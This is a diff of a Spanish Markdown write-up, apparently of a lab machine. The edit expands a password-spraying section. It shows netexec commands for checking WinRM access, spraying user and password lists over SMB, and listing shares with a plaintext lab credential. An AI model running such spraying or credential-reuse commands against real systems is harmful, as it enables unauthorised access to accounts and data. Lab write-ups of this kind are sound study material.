@@ -207,16 +207,20 @@ También validaremos si el usuario pertenece al grupo de remote management, usan
 nxc winrm 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
 ```
 
-En caso de que pertenezca a este aparecería el `pwned` en este caso el usuario no pertenece a este grupo asi que podemos seguir explotando [[#Password spraying]] sobre los demas usuarios con 
+En caso de que pertenezca a este aparecería el `pwned` en este caso el usuario no pertenece a este grupo así que podemos seguir explotando [[#Password spraying]] sobre los demás usuarios con [[CRACKMAPEXEC]] con las opciones
+- `smb` para usar el servicio SMB para hacer el ataque
+- `-u` para pasarle una lista de usuarios
+- `-p` para pasarle una lista de contraseñas
+- `--continue-on-success` para que no se pare aunque encuentre una coincidencia valida
+```shell
+nxc smb 10.129.231.149 -u users.txt -p passwords --continue-on-success
+```
 
-También podemos verificar si esa contraseña le pertenece a algún usuario mas
-`nxc smb 10.129.231.149 -u users.txt -p passwords --continue-on-success`
-
-Y no hay ningún usuario mas
+Después de la finalización no nos devuelve ningún usuario mas con las credenciales reutilizadas
 
 ## Listar recursos compartidos con credenciales validas
 
-Para listar estos recursos compartidos con un usuario valido usaremos
+Para listar estos recursos compartidos con un usuario valido usaremos [[CRACKMAPEXEC]] con las op
 `nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares`
 
 ```txt
